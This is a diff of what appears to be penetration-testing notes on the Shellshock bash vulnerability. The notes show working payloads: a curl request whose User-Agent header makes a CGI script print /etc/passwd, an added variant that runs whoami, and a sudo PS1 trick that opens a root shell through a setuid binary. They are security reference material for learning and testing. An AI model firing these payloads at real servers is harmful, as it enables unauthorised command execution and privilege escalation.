@@ -6,7 +6,19 @@ To understand shellshock few blogs can be referred such as [ShellShocked – A q
 curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat
 ```
 
- It is important to understand what is cgi-bin which can be read from [Creating CGI Programs with Bash: Getting Started](http://www.team2053.org/docs/bashcgi/gettingstarted.html). Also the most important lines in this file are:
+alternative
+
+```
+In the user agent in burp
+
+() { :; }; echo; echo; /usr/bin/whoami
+```
+
+
+
+
+
+It is important to understand what is cgi-bin which can be read from [Creating CGI Programs with Bash: Getting Started](http://www.team2053.org/docs/bashcgi/gettingstarted.html). Also the most important lines in this file are:
 
 ```
 echo "Content-type: text/html"
@@ -23,5 +35,5 @@ Binaries with a setuid bit and calling \(directly or indirectly\) bash through e
 sudo PS1="() { :;} ;  /bin/sh" /home/username/suidbinary
 ```
 
- Shellshock also affects DHCP as mentioned [Shellshock DHCP RCE Proof of Concept](https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/). There’s a metasploit module named “Dhclient Bash Environment Variable Injection \(Shellshock\)” for this.
+Shellshock also affects DHCP as mentioned [Shellshock DHCP RCE Proof of Concept](https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/). There’s a metasploit module named “Dhclient Bash Environment Variable Injection \(Shellshock\)” for this.
 
